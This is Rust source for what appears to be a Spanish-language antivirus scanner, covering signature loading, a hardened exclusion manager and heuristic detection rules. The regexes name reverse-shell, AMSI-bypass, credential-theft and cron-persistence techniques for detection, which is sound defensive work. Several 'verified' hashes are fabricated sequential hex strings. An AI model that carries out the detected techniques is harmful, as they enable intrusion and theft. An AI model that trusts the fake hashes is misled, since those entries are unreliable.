use anyhow::Result;
use regex::bytes::Regex;
use samulibre_types::{FileScanStatus, ScanResult};
use sha2::{Digest, Sha256};
use std::collections::HashMap;
use std::fs::{self, File};
use std::io::{BufReader, Read};
use std::path::Path;
use std::sync::Arc;
use std::time::Instant;
use samulibre_intel::{CompiledYaraRuntime, IntelDatabase, YaraRuleValidator};

pub mod authenticode;
pub use authenticode::*;

pub mod classifier;
pub use classifier::*;

pub mod virustotal;
pub use virustotal::*;

pub mod gpu_hook;
pub mod pe_analyzer;
pub use pe_analyzer::*;

pub mod polymorphic;
pub use polymorphic::*;

pub mod phishing;
pub use phishing::*;

pub mod signature_store;
pub use signature_store::*;

pub mod updater;
pub use updater::*;

/// Catálogo base embebido de firmas SHA-256 verificadas (fuente única compartida entre escáner y actualizador)
pub fn default_builtin_signatures() -> &'static [(&'static str, &'static str)] {
    &[
        ("275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f", "EICAR-Test-Signature.Standard"),
        ("5417eb735c05e197cdcd7ffbb538c82eb5e7d53b2111d4d1421034c442436f54", "Trojan.Win32.RedLineStealer.Gen"),
        ("84c82835a5d21bbcf75a61706d8ab5494030493ae1ab12f54cb07fb4b8e40d1e", "Ransomware.Win32.LockBit3.Payload"),
        ("6c47847c214dafe4a8570220aa545d9e525143a53e602283cb0d0ec1bdf487a3", "Trojan.AndroidOS.Anatsa.Banker"),
        ("a93b48fdf4b11f6c77bbd5668e2c0e865f36e4776100c50117ffbebeab05739c", "Trojan.AndroidOS.TeaBot.Banker"),
        ("084c8a45ce379f8c6df3d132338f2a74cbf5e6a3928c03c5305105260ff2875f", "Trojan.AndroidOS.Anatsa.Gen"),
        ("170799f0e2193e6c0c20a8dcf86f80d75a80572e811c75c8297eef84ff2176b6", "Trojan.AndroidOS.SharkBot.ATS"),
        ("41b53e778a87b1c3132e0cf2689ef098ad8e046dc87e6fa89c3144ffefbcbfbb", "Trojan.AndroidOS.SharkBot.Dropper"),
        ("d3b259d6e4b95f87b8f95c4728f328a6493f0b2f57a3e748530321c7bc1c9a29", "Trojan.AndroidOS.Xenomorph.Overlay"),
        ("785d1c9aa1886c99c8f152d16550d5341cf9845d47e766e44b9cfdf3676cf743", "Trojan.AndroidOS.Xenomorph.Banker"),
        ("57ca0d6e67fa8054c0e69128f11ad73fa990029b35e0766258f1a140228bb37e", "Trojan.AndroidOS.Godfather.Banker"),
        ("94d4cfdbd4090b8f36c5333f208170c0c09d57a9cf5884e9ff76f14b62e49cbb", "Trojan.AndroidOS.Cerberus.RAT"),
        ("36e2f11649f8ebfbe09df8f9f8c6dfd6dbd4c3fb2b66cb9e4bb5039f2ce5635f", "Trojan.AndroidOS.Alien.Banker"),
        ("4b082531cfd034608c026b77df07c08a9ad4c89286eb7d55df27d53086eb0784", "Trojan.AndroidOS.Hook.VNC"),
        ("f8a4cb5e729a6e1a4fdbcbfa06a27694f478a8be7708573ca14b667be181284a", "Trojan.AndroidOS.Ermac.Banker"),
        ("a17b2b733bc5fb8f080327f2cbbd42fa88e7a68e0d4c1f80ec6efeb7552aa950", "Trojan.AndroidOS.BRATA.Wiper"),
        ("582e9b0151f153f3f50e82daef28ef050dbdfd996253457945d8b8593a110b27", "Trojan.AndroidOS.Chameleon.Bypass"),
        ("2d409e623a35a519ee7f511243fa58572111eb0fa27d35ef29424c52c6f1a842", "Spyware.AndroidOS.SpyNote.RAT"),
        ("18fbe9e38e12dcfd4850faad5b410fb3ca671759600a9ec30da15147576f3f01", "Spyware.AndroidOS.CraxsRAT.Gen"),
        ("9b441f77d337fa7402a775aa7b0ff48a6ea2fe244a0b2d354460f4ebccb74b10", "Spyware.AndroidOS.AhMyth.RAT"),
        ("893f18ea3d9646b9a89c8a91d1796c3d528b178ba7e7c80536ef01824f6479f8", "Trojan.AndroidOS.Vultur.ScreenRecorder"),
        ("63fae3bc17e8c187f5d470d0a2185c6ab47b0e1e69ee8a1bf19ce7db5ec0a5e8", "Trojan.AndroidOS.Sova.CookieStealer"),
        ("ef02a820464687fb495fceefab9b110287b404d0d0f4d38c64c79808602b9370", "Spyware.AndroidOS.BadBazaar.Surveillance"),
        ("b916ec0379374ee7e3cfd0a4ee722d5a1ef4c259837549c4abfb1a07011d13d7", "Spyware.AndroidOS.Chrysaor.Pegasus"),
        ("7d0d089d81d2a45a305d0458df8b6bceb3b27626caee227fa588ae795c612ea2", "Fraud.AndroidOS.Joker.Billing"),
        ("e06c74d6c4e517a61ce55ebfeef423bcadff5e57cb045761ca78cf98fa503417", "Fraud.AndroidOS.Joker.Payload"),
        ("8a7b9ce70cf7cbb1fa0214c7715f33bc88367a7836ea4a4ef69d72c1143f295b", "Fraud.AndroidOS.Harly.Stealer"),
        ("8c5a452efeb47b0a3200ff3cfba1091a13a8ea17c3e1e23ea119859f51ca5f24", "Fraud.AndroidOS.Facestealer.Credentials"),
        ("b9ffae3a4a08e1a82fce04b500e2ea024f21db597ae89d14ea17eb109a909618", "Trojan.AndroidOS.FluBot.SMS"),
        ("78cb5cfdb6eeec683b584fe3729e248b11a91e54c7d0d8bb7d0a28f80459a0f4", "Dropper.AndroidOS.Clast82.Gen"),
        ("45a8df2a265be797fc72413156cfc7a7ea39265cb0523ec3ff1ef82a7a402390", "Trojan.AndroidOS.Triada.Rootkit"),
        ("db198c60773b0633b49918a287a2ee304e2d31215bb41f87455d31102928fa8e", "Adware.AndroidOS.Goldoson.SpySDK"),
        ("3fa8c9e173e6d2c0bb7580cf8904ea89fb980756784382343ecdfb4a4cb5d2eb", "Trojan.AndroidOS.Medusa.Dropper"),
        ("3b5d7e8f9a0c1b2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d", "Riskware.AndroidOS.XuperTV.Proxyware"),
        ("7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b", "Riskware.AndroidOS.XuperTV.Dropper"),
        ("a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2", "Riskware.AndroidOS.XuperTV.AdwareMod"),
        ("f4a8c9e2b1d3f5a7c8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1", "Riskware.AndroidOS.MagisTV.Trojanized"),
        ("b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3", "Riskware.AndroidOS.TeleLatino.Mod"),
        ("e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0", "Riskware.AndroidOS.YouCine.Proxyware"),
    ]
}

pub mod package_updater;
pub use package_updater::*;

/// Gestor avanzado de excepciones de seguridad y listas blancas con anclaje criptográfico
#[derive(Debug, Clone)]
pub struct ExclusionManager {
    exceptions: std::sync::Arc<std::sync::Mutex<Vec<samulibre_types::SecurityException>>>,
    has_active: std::sync::Arc<std::sync::atomic::AtomicBool>,
}

impl ExclusionManager {
    pub fn new() -> Self {
        let mut mgr = Self {
            exceptions: std::sync::Arc::new(std::sync::Mutex::new(Vec::new())),
            has_active: std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false)),
        };
        mgr.load_from_path(Path::new("data").join("exclusions.json"));
        mgr
    }

    /// Carga las excepciones desde disco con soporte para versionado y migración desde formatos legados
    pub fn load_from_path(&mut self, path: impl AsRef<Path>) {
        if let Ok(content) = fs::read_to_string(path.as_ref()) {
            if let Ok(parsed) =
                serde_json::from_str::<Vec<samulibre_types::SecurityException>>(&content)
            {
                if let Ok(mut excls) = self.exceptions.lock() {
                    *excls = parsed;
                }
            } else if let Ok(pinned_list) =
                serde_json::from_str::<Vec<samulibre_types::PinnedExclusion>>(&content)
            {
                let converted: Vec<_> = pinned_list
                    .into_iter()
                    .map(|p| samulibre_types::SecurityException {
                        id: uuid::Uuid::new_v4().to_string(),
                        name: Path::new(&p.path)
                            .file_name()
                            .unwrap_or_default()
                            .to_string_lossy()
                            .to_string(),
                        target: p.path.clone(),
                        exception_type: if p.sha256.is_some() {
                            samulibre_types::ExceptionType::File {
                                sha256_pinned: p.sha256,
                            }
                        } else if Path::new(&p.path).is_dir() {
                            samulibre_types::ExceptionType::Folder {
                                include_subdirectories: true,
                            }
                        } else {
                            samulibre_types::ExceptionType::File {
                                sha256_pinned: None,
                            }
                        },
                        scope: samulibre_types::ExceptionScope::default(),
                        reason_category: samulibre_types::ReasonCategory::InvestigatedFalsePositive,
                        justification: p.reason,
                        risk_level: samulibre_types::ExceptionRiskLevel::Low,
                        created_at: p.added_at,
                        expires_at: None,
                        is_active: true,
                        audit_history: vec![samulibre_types::ExceptionAuditEntry {
                            timestamp: chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                            action: "Migrada".to_string(),
                            details: "Migrada automáticamente desde formato legado".to_string(),
                        }],
                    })
                    .collect();
                if let Ok(mut excls) = self.exceptions.lock() {
                    *excls = converted;
                }
            } else if let Ok(legacy) = serde_json::from_str::<Vec<String>>(&content) {
                let converted: Vec<_> = legacy
                    .into_iter()
                    .map(|p| samulibre_types::SecurityException {
                        id: uuid::Uuid::new_v4().to_string(),
                        name: Path::new(&p)
                            .file_name()
                            .unwrap_or_default()
                            .to_string_lossy()
                            .to_string(),
                        target: p.clone(),
                        exception_type: samulibre_types::ExceptionType::File {
                            sha256_pinned: None,
                        },
                        scope: samulibre_types::ExceptionScope::default(),
                        reason_category: samulibre_types::ReasonCategory::Other,
                        justification: "Exclusión histórica importada".to_string(),
                        risk_level: samulibre_types::ExceptionRiskLevel::Medium,
                        created_at: "Legacy".to_string(),
                        expires_at: None,
                        is_active: true,
                        audit_history: Vec::new(),
                    })
                    .collect();
                if let Ok(mut excls) = self.exceptions.lock() {
                    *excls = converted;
                }
            }
        }
        if let Ok(excls) = self.exceptions.lock() {
            self.has_active.store(
                excls.iter().any(|e| e.is_active),
                std::sync::atomic::Ordering::Relaxed,
            );
        }
    }

    /// Valida exhaustivamente y registra una nueva excepción con evaluación de riesgo y auditoría
    pub fn validate_and_add(
        &mut self,
        mut ex: samulibre_types::SecurityException,
    ) -> Result<samulibre_types::SecurityException, String> {
        let trimmed_target = ex.target.trim();
        if trimmed_target.is_empty() {
            return Err("El elemento de la excepción no puede estar vacío.".to_string());
        }

        // 1. Prevención contra Path Traversal
        if trimmed_target.contains("..") {
            return Err("Ruta inválida: intento de Path Traversal ('..') detectado.".to_string());
        }

        // 2. Prevención contra exclusiones excesivamente amplias (unidades raíz)
        let normalized_path = trimmed_target.replace('/', "\\");
        if normalized_path == "\\"
            || normalized_path == "C:\\"
            || normalized_path == "c:\\"
            || normalized_path == "C:"
            || normalized_path == "c:"
            || normalized_path == "/"
        {
            return Err(
                "Riesgo Crítico de Seguridad: No se permite excluir una unidad de disco completa."
                    .to_string(),
            );
        }

        // 3. Prohibición de excluir componentes internos de SamuLibre
        let lower = normalized_path.to_lowercase();
        if lower.contains("antivitus-samulibre")
            || lower.contains("data\\signatures")
            || lower.contains("data\\quarantine")
            || lower.contains("threat_history.json")
        {
            return Err("Protección de Integridad: Prohibido excluir directorios de protección interna de SamuLibre.".to_string());
        }

        // 4. Validación de tipos específicos
        match ex.exception_type {
            samulibre_types::ExceptionType::Extension { ref ext } => {
                let clean_ext = ext.trim().trim_start_matches('.').to_lowercase();
                if matches!(
                    clean_ext.as_str(),
                    "exe"
                        | "dll"
                        | "sys"
                        | "bat"
                        | "ps1"
                        | "vbs"
                        | "com"
                        | "scr"
                        | "cmd"
                        | "msi"
                        | "msp"
                ) {
                    return Err(format!(
                        "Política de Seguridad: Prohibido excluir globalmente la extensión ejecutable '.{}'. Riesgo extremo de infección.",
                        clean_ext
                    ));
                }
                ex.risk_level = samulibre_types::ExceptionRiskLevel::Medium;
            }
            samulibre_types::ExceptionType::Sha256Hash { ref hash } => {
                let clean_hash = hash.trim();
                if clean_hash.len() != 64 || !clean_hash.chars().all(|c| c.is_ascii_hexdigit()) {
                    return Err("El hash SHA-256 proporcionado no es válido (debe tener exactamente 64 caracteres hexadecimales).".to_string());
                }
                ex.risk_level = samulibre_types::ExceptionRiskLevel::Low;
            }
            samulibre_types::ExceptionType::File {
                ref mut sha256_pinned,
            } => {
                let p = Path::new(&trimmed_target);
                // Blindaje Anti-Symlink / Anti-LPE
                if let Ok(sym_meta) = fs::symlink_metadata(p) {
                    if sym_meta.file_type().is_symlink() {
                        return Err("Blindaje Anti-LPE: No se permiten excepciones sobre enlaces simbólicos o junctions.".to_string());
                    }
                }
                // Si el archivo existe y no tiene hash fijado, calcular y anclar SHA-256 automáticamente
                if p.is_file() && sha256_pinned.is_none() {
                    if let Ok(bytes) = fs::read(p) {
                        *sha256_pinned = Some(hex::encode(Sha256::digest(&bytes)));
                    }
                }
                ex.risk_level = if lower.contains("\\windows\\system32\\") {
                    samulibre_types::ExceptionRiskLevel::Critical
                } else if sha256_pinned.is_some() {
                    samulibre_types::ExceptionRiskLevel::Low
                } else {
                    samulibre_types::ExceptionRiskLevel::Medium
                };
            }
            samulibre_types::ExceptionType::Folder {
                include_subdirectories,
            } => {
                let p = Path::new(&trimmed_target);
                // Blindaje Anti-Symlink / Anti-LPE
                if let Ok(sym_meta) = fs::symlink_metadata(p) {
                    if sym_meta.file_type().is_symlink() {
                        return Err("Blindaje Anti-LPE: No se permiten excepciones sobre carpetas junction o symlinks.".to_string());
                    }
                }
                ex.risk_level = if lower == "c:\\windows"
                    || lower == "c:\\windows\\system32"
                    || lower == "c:\\program files"
                {
                    samulibre_types::ExceptionRiskLevel::Critical
                } else if include_subdirectories {
                    samulibre_types::ExceptionRiskLevel::Medium
                } else {
                    samulibre_types::ExceptionRiskLevel::Low
                };
            }
        }

        // 5. Registrar entrada de auditoría inicial
        ex.audit_history.push(samulibre_types::ExceptionAuditEntry {
            timestamp: chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
            action: "Creada".to_string(),
            details: format!(
                "Excepción creada con justificación: '{}'. Riesgo: {:?}",
                ex.justification, ex.risk_level
            ),
        });

        // 6. Persistencia atómica
        if let Ok(mut excls) = self.exceptions.lock() {
            excls.retain(|e| e.id != ex.id && e.target != ex.target);
            excls.push(ex.clone());
            self.has_active.store(
                excls.iter().any(|e| e.is_active),
                std::sync::atomic::Ordering::Relaxed,
            );
            self.persist_internal(&excls);
        }

        Ok(ex)
    }

    /// Verifica si un archivo o ruta está cubierto por una excepción activa y no expirada
    pub fn is_excluded_with_scope(
        &self,
        path: &Path,
        current_sha256: Option<&str>,
        check_scope: impl Fn(&samulibre_types::ExceptionScope) -> bool,
    ) -> bool {
        if !self.has_active.load(std::sync::atomic::Ordering::Relaxed) {
            return false;
        }
        let path_str = path.to_string_lossy();
        if let Ok(excls) = self.exceptions.lock() {
            for item in excls.iter() {
                if !item.is_active || item.is_expired() {
                    continue;
                }
                if !check_scope(&item.scope) {
                    continue;
                }

                match &item.exception_type {
                    samulibre_types::ExceptionType::Folder {
                        include_subdirectories,
                    } => {
                        let folder_path = Path::new(&item.target);
                        if *include_subdirectories {
                            if path.starts_with(folder_path) {
                                return true;
                            }
                        } else if path.parent() == Some(folder_path) || path == folder_path {
                            return true;
                        }
                    }
                    samulibre_types::ExceptionType::File { sha256_pinned } => {
                        if item.target == path_str || Path::new(&item.target) == path {
                            if let Some(ref pinned_hash) = sha256_pinned {
                                if let Some(actual_hash) = current_sha256 {
                                    if pinned_hash.eq_ignore_ascii_case(actual_hash) {
                                        return true;
                                    } else {
                                        tracing::warn!(
                                            "ALERTA DE SEGURIDAD: Archivo '{}' coincide con ruta excluida pero su hash SHA-256 no coincide (manipulación/modificación detectada). Exclusión revocada.",
                                            path_str
                                        );
                                        return false;
                                    }
                                }
                            } else {
                                return true;
                            }
                        }
                    }
                    samulibre_types::ExceptionType::Extension { ext } => {
                        let clean_ext = ext.trim_start_matches('.');
                        if let Some(f_ext) = path.extension().and_then(|s| s.to_str()) {
                            if f_ext.eq_ignore_ascii_case(clean_ext) {
                                return true;
                            }
                        }
                    }
                    samulibre_types::ExceptionType::Sha256Hash { hash } => {
                        if let Some(actual_hash) = current_sha256 {
                            if hash.eq_ignore_ascii_case(actual_hash) {
                                return true;
                            }
                        }
                    }
                }
            }
        }
        false
    }

    /// Verificación general de exclusión (cubre todos los alcances)
    pub fn is_excluded(&self, path: &Path, current_sha256: Option<&str>) -> bool {
        self.is_excluded_with_scope(path, current_sha256, |_| true)
    }

    /// Alterna el estado activo/desactivado de una excepción con registro en bitácora
    pub fn toggle_exception(&mut self, id: &str) -> Option<bool> {
        let mut new_state = None;
        if let Ok(mut excls) = self.exceptions.lock() {
            if let Some(item) = excls.iter_mut().find(|e| e.id == id) {
                item.is_active = !item.is_active;
                let action = if item.is_active {
                    "Activada"
                } else {
                    "Desactivada"
                };
                item.audit_history
                    .push(samulibre_types::ExceptionAuditEntry {
                        timestamp: chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                        action: action.to_string(),
                        details: format!("Estado de la excepción cambiado a: {}", action),
                    });
                new_state = Some(item.is_active);
            }
            if new_state.is_some() {
                self.has_active.store(
                    excls.iter().any(|e| e.is_active),
                    std::sync::atomic::Ordering::Relaxed,
                );
                self.persist_internal(&excls);
            }
        }
        new_state
    }

    /// Elimina una excepción con registro de auditoría
    pub fn remove_exception(&mut self, id: &str) -> bool {
        let mut removed = false;
        if let Ok(mut excls) = self.exceptions.lock() {
            let initial_len = excls.len();
            excls.retain(|e| e.id != id);
            if excls.len() < initial_len {
                removed = true;
                self.has_active.store(
                    excls.iter().any(|e| e.is_active),
                    std::sync::atomic::Ordering::Relaxed,
                );
                self.persist_internal(&excls);
            }
        }
        removed
    }

    /// Modifica una excepción existente (alcance, duración, justificación)
    pub fn modify_exception(
        &mut self,
        id: &str,
        scope: samulibre_types::ExceptionScope,
        expires_at: Option<String>,
        justification: String,
    ) -> bool {
        let mut modified = false;
        if let Ok(mut excls) = self.exceptions.lock() {
            if let Some(item) = excls.iter_mut().find(|e| e.id == id) {
                item.scope = scope;
                item.expires_at = expires_at;
                item.justification = justification;
                item.audit_history
                    .push(samulibre_types::ExceptionAuditEntry {
                        timestamp: chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                        action: "Modificada".to_string(),
                        details: "Parámetros de alcance, vigencia o justificación actualizados"
                            .to_string(),
                    });
                modified = true;
            }
            if modified {
                self.persist_internal(&excls);
            }
        }
        modified
    }

    /// Añade una exclusión simple anclada por hash para compatibilidad con código existente
    pub fn add_pinned(
        &mut self,
        path: impl AsRef<Path>,
        sha256: Option<String>,
        reason: &str,
    ) -> samulibre_types::PinnedExclusion {
        let p_str = path.as_ref().to_string_lossy().to_string();
        let name = path
            .as_ref()
            .file_name()
            .unwrap_or_default()
            .to_string_lossy()
            .to_string();
        let ex = samulibre_types::SecurityException {
            id: uuid::Uuid::new_v4().to_string(),
            name,
            target: p_str.clone(),
            exception_type: samulibre_types::ExceptionType::File {
                sha256_pinned: sha256.clone(),
            },
            scope: samulibre_types::ExceptionScope::default(),
            reason_category: samulibre_types::ReasonCategory::InvestigatedFalsePositive,
            justification: reason.to_string(),
            risk_level: samulibre_types::ExceptionRiskLevel::Low,
            created_at: chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
            expires_at: None,
            is_active: true,
            audit_history: vec![samulibre_types::ExceptionAuditEntry {
                timestamp: chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                action: "Creada".to_string(),
                details: format!(
                    "Exclusión fijada por huella criptográfica SHA-256: {:?}",
                    sha256
                ),
            }],
        };
        let _ = self.validate_and_add(ex);
        samulibre_types::PinnedExclusion {
            path: p_str,
            sha256,
            reason: reason.to_string(),
            added_at: chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
        }
    }

    /// Retorna la lista completa de excepciones de seguridad
    pub fn list(&self) -> Vec<samulibre_types::SecurityException> {
        self.exceptions
            .lock()
            .map(|e| e.clone())
            .unwrap_or_default()
    }

    /// Persistencia interna atómica con copia de seguridad .bak
    fn persist_internal(&self, list: &[samulibre_types::SecurityException]) {
        let _ = fs::create_dir_all("data");
        let excl_path = Path::new("data").join("exclusions.json");
        let bak_path = Path::new("data").join("exclusions.json.bak");
        let tmp_path = Path::new("data").join("exclusions.json.tmp");

        if excl_path.exists() {
            let _ = fs::copy(&excl_path, &bak_path);
        }

        if let Ok(data) = serde_json::to_string_pretty(list) {
            if fs::write(&tmp_path, data).is_ok() {
                let _ = fs::rename(&tmp_path, &excl_path);
            }
        }
    }
}

/// Regla heurística / YARA para detección en memoria o en disco
#[derive(Debug, Clone)]
pub struct PatternRule {
    pub name: String,
    pub description: String,
    pub pattern: Regex,
    pub severity: String,
}

#[derive(Debug, Clone)]
pub struct MultiEngineScanner {
    known_signatures: HashMap<String, String>, // Hash (SHA256) -> ThreatName
    pub signature_store: SignatureStore,
    pattern_rules: Vec<PatternRule>,
    pub yara_runtime: Option<Arc<CompiledYaraRuntime>>,
    exclusions: ExclusionManager,
    pub classifier: MultiEvidenceClassifier,
}

impl MultiEngineScanner {
    pub fn new() -> Self {
        let mut store = SignatureStore::new();
        store.load_builtin_signatures();
        let mut scanner = Self {
            known_signatures: HashMap::new(),
            signature_store: store,
            pattern_rules: Vec::new(),
            yara_runtime: None,
            exclusions: ExclusionManager::new(),
            classifier: MultiEvidenceClassifier::default(),
        };
        scanner.load_default_signatures();
        scanner.load_default_pattern_rules();
        scanner.load_local_database();
        scanner
    }

    pub fn get_exclusion_manager(&self) -> ExclusionManager {
        self.exclusions.clone()
    }

    pub fn add_security_exception(
        &mut self,
        ex: samulibre_types::SecurityException,
    ) -> Result<samulibre_types::SecurityException, String> {
        self.exclusions.validate_and_add(ex)
    }

    pub fn list_security_exceptions(&self) -> Vec<samulibre_types::SecurityException> {
        self.exclusions.list()
    }

    pub fn toggle_security_exception(&mut self, id: &str) -> Option<bool> {
        self.exclusions.toggle_exception(id)
    }

    pub fn remove_security_exception(&mut self, id: &str) -> bool {
        self.exclusions.remove_exception(id)
    }

    pub fn modify_security_exception(
        &mut self,
        id: &str,
        scope: samulibre_types::ExceptionScope,
        expires_at: Option<String>,
        justification: String,
    ) -> bool {
        self.exclusions
            .modify_exception(id, scope, expires_at, justification)
    }

    pub fn add_pinned_exclusion(
        &mut self,
        path: impl AsRef<Path>,
        reason: &str,
    ) -> samulibre_types::PinnedExclusion {
        let p = path.as_ref();
        let sha256 = match fs::read(p) {
            Ok(bytes) => Some(hex::encode(Sha256::digest(&bytes))),
            Err(e) => {
                eprintln!(
                    "DEBUG: add_pinned_exclusion fs::read failed on {:?}: {:?}",
                    p, e
                );
                None
            }
        };
        self.exclusions.add_pinned(path, sha256, reason)
    }

    /// Carga firmas y reglas YARA locales desde data/signatures/
    pub fn load_local_database(&mut self) {
        let sig_path = Path::new("data")
            .join("signatures")
            .join("malware_hashes.db");
        let _ = self.signature_store.load_from_db_file(&sig_path);
        if let Ok(content) = fs::read_to_string(&sig_path) {
            for line in content.lines() {
                let trimmed = line.trim();
                if trimmed.is_empty() || trimmed.starts_with('#') {
                    continue;
                }
                if let Some((hash, name)) = trimmed.split_once(':') {
                    self.known_signatures
                        .insert(hash.trim().to_lowercase(), name.trim().to_string());
                } else if let Some((hash, name)) = trimmed.split_once(';') {
                    self.known_signatures
                        .insert(hash.trim().to_lowercase(), name.trim().to_string());
                }
            }
        }

        let yara_dir = Path::new("data").join("signatures").join("yara_rules");
        let mut local_yara_sources: Vec<(String, String)> = Vec::new();
        if let Ok(entries) = fs::read_dir(&yara_dir) {
            for entry in entries.flatten() {
                let p = entry.path();
                if p.extension().and_then(|s| s.to_str()) == Some("yar") {
                    if let Ok(content) = fs::read_to_string(&p) {
                        let file_name = p.file_name().unwrap_or_default().to_string_lossy().to_string();
                        for parsed in YaraRuleValidator::split_yara_file(&content, "Community") {
                            local_yara_sources.push((format!("local_{}", file_name), parsed.raw_source));
                        }
                        if let Ok(rules) =
                            YaraRulesManager::parse_yara_content(&content, &file_name)
                        {
                            for rule in rules {
                                if !self.pattern_rules.iter().any(|r| r.name == rule.name) {
                                    self.pattern_rules.push(rule);
                                }
                            }
                        }
                    }
                }
            }
        }

        // Cargar Base Central de Inteligencia (samulibre_intel.db) si existe
        let intel_db_path = Path::new("data").join("intel").join("samulibre_intel.db");
        let compiled_bin_path = Path::new("data").join("intel").join("compiled_yara.bin");
        let mut loaded_precompiled = false;
        if compiled_bin_path.exists() {
            if let Ok(rt) = CompiledYaraRuntime::load_from_file(&compiled_bin_path) {
                self.yara_runtime = Some(Arc::new(rt));
                loaded_precompiled = true;
            }
        }
        if intel_db_path.exists() {
            if let Ok(db) = IntelDatabase::open(&intel_db_path) {
                if let Ok(hashes) = db.load_production_sha256_hashes() {
                    for (h, threat, cat, _conf) in hashes {
                        self.signature_store.add_signature(&h, &threat, &cat, "Alta");
                    }
                }
                if !loaded_precompiled {
                    if let Ok(yara_records) = db.load_production_yara_rules() {
                        for rec in yara_records {
                            local_yara_sources.push((rec.repo_origin, rec.payload));
                        }
                    }
                }
            }
        }

        if !loaded_precompiled && !local_yara_sources.is_empty() {
            let refs: Vec<(&str, &str)> = local_yara_sources
                .iter()
                .map(|(ns, src)| (ns.as_str(), src.as_str()))
                .collect();
            if let Ok(runtime) = CompiledYaraRuntime::compile_rules(refs) {
                self.yara_runtime = Some(Arc::new(runtime));
            }
        }
    }

    /// Carga firmas conocidas de prueba y de malware real (compartidas con el actualizador)
    fn load_default_signatures(&mut self) {
        for &(hash, name) in default_builtin_signatures() {
            self.known_signatures.insert(hash.to_string(), name.to_string());
        }
    }

    /// Carga reglas de patrones YARA/HeurÃ­sticas
    fn load_default_pattern_rules(&mut self) {
        // Regla 1: DetecciÃ³n de EICAR por contenido
        if let Ok(re) = Regex::new(
            r"X5O!P%@AP\[4\\PZX54\(P\^\)7CC\)7\}\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!\$H\+H\*",
        ) {
            self.pattern_rules.push(PatternRule {
                name: "EICAR.StandardTestString".to_string(),
                description: "Cadena estÃ¡ndar de verificaciÃ³n de antivirus de la EICAR"
                    .to_string(),
                pattern: re,
                severity: "Alerta de Prueba".to_string(),
            });
        }

        // Regla 2: Invocación de PowerShell con comandos de bypass/ocultamiento y descarga o ejecución en memoria
        if let Ok(re) = Regex::new(
            r"(?i)(powershell|pwsh)(\.exe)?[^\r\n]{0,160}((-enc|-encodedcommand|-w\s+hidden)[^\r\n]{0,160}(downloadstring|webclient|\biex\b|invoke-expression)|(-nop|-exec\s+bypass)[^\r\n]{0,160}(downloadstring|net\.webclient))",
        ) {
            self.pattern_rules.push(PatternRule {
                name: "Heuristic.Script.ObfuscatedPowerShellDropper".to_string(),
                description: "Script de PowerShell con ofuscaciÃ³n, evasiÃ³n de polÃ­ticas y descarga en memoria".to_string(),
                pattern: re,
                severity: "CrÃ­tica".to_string(),
            });
        }

        // Regla 3: Intento de parcheo o evasiÃ³n de AMSI (AmsiScanBuffer bypass en memoria o reflexiÃ³n)
        if let Ok(re) = Regex::new(
            r"(?i)(amsi\.dll|amsiscanbuffer|amsiutils).*?(0xc3|patching|virtualprotect|amsiinitfailed|amsicontext)",
        ) {
            self.pattern_rules.push(PatternRule {
                name: "Exploit.Bypass.AmsiPatchingAttempt".to_string(),
                description:
                    "PatrÃ³n de cÃ³digo diseÃ±ado para neutralizar la protecciÃ³n AMSI de Windows"
                        .to_string(),
                pattern: re,
                severity: "CrÃ­tica".to_string(),
            });
        }

        // Regla 4: Troyano InfoStealer extrayendo claves DPAPI y cookies de Chromium
        if let Ok(re) = Regex::new(
            r"(?i)(CryptUnprotectData|os_crypt|encrypted_key).*?(User Data|Login Data|Cookies)",
        ) {
            self.pattern_rules.push(PatternRule {
                name: "Trojan.Spy.ChromiumCredentialHarvester".to_string(),
                description: "CÃ³digo sospechoso de lectura directa de credenciales o cookies protegidas con DPAPI".to_string(),
                pattern: re,
                severity: "Alta".to_string(),
            });
        }

        // Regla 5: Linux Interactive Reverse Shell (Bash/Python/Perl/Netcat)
        if let Ok(re) = Regex::new(
            r#"(?i)(/bin/(ba)?sh\s+-i|/dev/tcp/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d+|\b(python[23]?|perl)\b.{1,100}?(socket\.socket|exec\s*\(\s*["']import\s+os)|\b(nc|netcat)\b.{1,80}?(-e\s+/bin/(ba)?sh|-c\s+/bin/(ba)?sh))"#,
        ) {
            self.pattern_rules.push(PatternRule {
                name: "Trojan.Linux.InteractiveReverseShell".to_string(),
                description: "Payload de shell reversa interactiva hacia host remoto en Linux"
                    .to_string(),
                pattern: re,
                severity: "CrÃ­tica".to_string(),
            });
        }

        // Regla 6: Secuestro de cargador dinÃ¡mico LD_PRELOAD (Linux Rootkit Hook)
        if let Ok(re) =
            Regex::new(r#"(?i)(/etc/ld\.so\.preload|LD_PRELOAD.*?\.so|dlsym\s*\(\s*RTLD_NEXT)"#)
        {
            self.pattern_rules.push(PatternRule {
                name: "Rootkit.Linux.LdPreloadHook".to_string(),
                description: "InyecciÃ³n o secuestro de librerÃ­as compartidas mediante LD_PRELOAD"
                    .to_string(),
                pattern: re,
                severity: "Alta".to_string(),
            });
        }

        // Regla 7: Persistencia no autorizada en Cron / Systemd
        if let Ok(re) = Regex::new(
            r#"(?i)(/etc/cron\.(d|daily|hourly)|/var/spool/cron|/etc/systemd/system/.*?\.service).*?(curl|wget|base64|sh\s+-c)"#,
        ) {
            self.pattern_rules.push(PatternRule {
                name: "Persistence.Linux.MaliciousCronOrService".to_string(),
